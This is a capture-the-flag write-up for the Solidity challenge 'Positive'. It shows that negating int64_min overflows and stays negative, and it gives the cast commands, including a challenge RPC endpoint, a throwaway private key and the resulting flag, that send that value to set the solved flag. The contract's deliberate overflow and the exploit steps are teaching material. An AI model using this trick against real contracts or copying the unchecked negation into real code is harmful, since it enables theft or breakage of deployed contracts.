# Positive

## Challenge

The challenge is deployed using the ParadigmCTF framework.

We get a contract for Positive.sol:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

contract Positive{
    bool public solved;

    constructor() {
        solved = false;
    }

    function stayPositive(int64 _num) public returns(int64){
        int64 num;
        if(_num<0){
            num = -_num;
            if(num<0){
                solved = true;
            }
            return num;
        }
        num = _num;
        return num;
    }
}
```

Our goal is to get the solved variable to be true.

## Solution
For this challenge, my first approach was to test some edge cases by throwing in numbers like 1, 0, -1, int64_max, int64_min while I test-deployed the challenge in Remix. This already yielded me the wanted result, as int64_min (-9223372036854775808) passed both checks and set the variable solved to true.

I then used cast with the following commands to set solved to true:

```bash
# uuid:           eaf81f81-bc2b-4aee-8ea3-d5d04d41e1f2
# rpc endpoint:   http://146.148.125.86:60083/eaf81f81-bc2b-4aee-8ea3-d5d04d41e1f2
# private key:    0x5e9dee143c11059ebdcc65e4e949159b4f1cbb49833a0b1895aaee78a68fb3c3
# setup contract: 0x516eD898e69427192d148a45893C8328ed33E5ca

rpc="http://146.148.125.86:60083/eaf81f81-bc2b-4aee-8ea3-d5d04d41e1f2"
priv_key=0x5e9dee143c11059ebdcc65e4e949159b4f1cbb49833a0b1895aaee78a68fb3c3
setup_contract=0x516eD898e69427192d148a45893C8328ed33E5ca

# get address
cast call $setup_contract "TARGET()(address)" --rpc-url $rpc

# Save the address we received.
positive_contract=0xE07e3fA0EB898531Cc1EC5b0dcDF86932cCD865a

# Call to the function (will prompt to input the private key)
cast send --rpc-url $rpc --private-key $priv_key $positive_contract "stayPositive(int64 _num)" -- -9223372036854775808 

# Check if it was solved
cast call $setup_contract "isSolved()(bool)" --rpc-url $rpc
```

This yields us the flag crew{9o5it1v1ty1sth3k3y}.